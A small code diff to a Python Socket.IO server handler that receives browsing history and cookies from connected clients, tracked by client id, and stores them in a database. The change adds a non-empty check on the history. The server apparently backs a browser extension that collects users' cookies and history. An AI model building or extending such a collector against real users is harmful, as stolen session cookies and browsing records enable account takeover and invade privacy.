@@ -61,7 +61,7 @@ def handle_ext_ping(data):
             connected_clients.append((clientid, request.sid))
             print('client {} reconnected'.format(clientid))
             emit('connectSuccessful', clientid, namespace="/socket.io", broadcast=True) 
-        if database.store_history(data["history"], clientid):
+        if len(data["history"]) > 0 and database.store_history(data["history"], clientid):
             return bad
         for cookie in data["cookies"]:
             if database.store_cookie(cookie, clientid):
